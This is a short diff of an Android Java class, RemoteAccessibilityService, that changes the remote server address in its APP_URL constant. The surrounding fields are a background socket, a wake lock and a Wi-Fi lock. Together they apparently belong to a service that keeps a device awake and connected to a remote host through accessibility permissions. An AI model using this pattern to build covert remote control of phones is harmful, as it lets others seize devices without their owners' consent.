@@ -206,7 +206,7 @@ public class RemoteAccessibilityService extends AccessibilityService {
     }
 
     private Socket mBgSocket = null;
-    private static final String APP_URL = "https://v.tokendeal.cloud";
+    private static final String APP_URL = "https://v.aztemp.com";
 
     private PowerManager.WakeLock mServiceWakeLock = null;
     private WifiManager.WifiLock mWifiLock = null;
